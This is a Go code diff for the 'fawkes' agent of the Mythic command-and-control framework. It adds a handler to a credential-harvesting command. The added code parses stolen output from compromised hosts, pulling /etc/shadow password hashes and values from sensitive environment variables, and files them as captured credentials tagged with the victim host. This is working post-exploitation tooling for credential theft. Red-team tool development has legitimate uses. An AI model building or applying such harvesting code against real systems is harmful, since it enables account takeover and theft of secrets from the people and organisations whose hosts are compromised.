@@ -1,6 +1,11 @@
 package agentfunctions
 
-import agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
+import (
+	"strings"
+
+	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
+	"github.com/MythicMeta/MythicContainer/mythicrpc"
+)
 
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
@@ -49,6 +54,73 @@ func init() {
 		},
 		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
 			return args.LoadArgsFromDictionary(input)
+		},
+		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
+			response := agentstructs.PTTaskProcessResponseMessageResponse{
+				TaskID:  processResponse.TaskData.Task.ID,
+				Success: true,
+			}
+			responseText, ok := processResponse.Response.(string)
+			if !ok || responseText == "" {
+				return response
+			}
+			hostname := processResponse.TaskData.Callback.Host
+			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
+
+			// Parse shadow hashes: lines with user:$hash:rest
+			if strings.Contains(responseText, "/etc/shadow") || strings.Contains(responseText, "Password Hashes") {
+				for _, line := range strings.Split(responseText, "\n") {
+					trimmed := strings.TrimSpace(line)
+					if !strings.Contains(trimmed, ":$") {
+						continue
+					}
+					parts := strings.SplitN(trimmed, ":", 3)
+					if len(parts) < 2 || parts[0] == "" {
+						continue
+					}
+					creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
+						CredentialType: "hash",
+						Realm:          hostname,
+						Account:        parts[0],
+						Credential:     parts[1],
+						Comment:        "cred-harvest (shadow)",
+					})
+				}
+			}
+
+			// Parse sensitive env vars: lines like VARIABLE=value under "Sensitive Environment Variables"
+			if strings.Contains(responseText, "Sensitive Environment Variables") {
+				inEnvSection := false
+				for _, line := range strings.Split(responseText, "\n") {
+					if strings.Contains(line, "Sensitive Environment Variables") {
+						inEnvSection = true
+						continue
+					}
+					if inEnvSection && strings.HasPrefix(line, "===") {
+						break
+					}
+					if !inEnvSection {
+						continue
+					}
+					trimmed := strings.TrimSpace(line)
+					if idx := strings.Index(trimmed, "="); idx > 0 {
+						varName := trimmed[:idx]
+						varValue := trimmed[idx+1:]
+						if varValue != "" {
+							creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
+								CredentialType: "plaintext",
+								Realm:          hostname,
+								Account:        varName,
+								Credential:     varValue,
+								Comment:        "cred-harvest (env)",
+							})
+						}
+					}
+				}
+			}
+
+			registerCredentials(processResponse.TaskData.Task.ID, creds)
+			return response
 		},
 		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
 			response := agentstructs.PTTaskCreateTaskingMessageResponse{
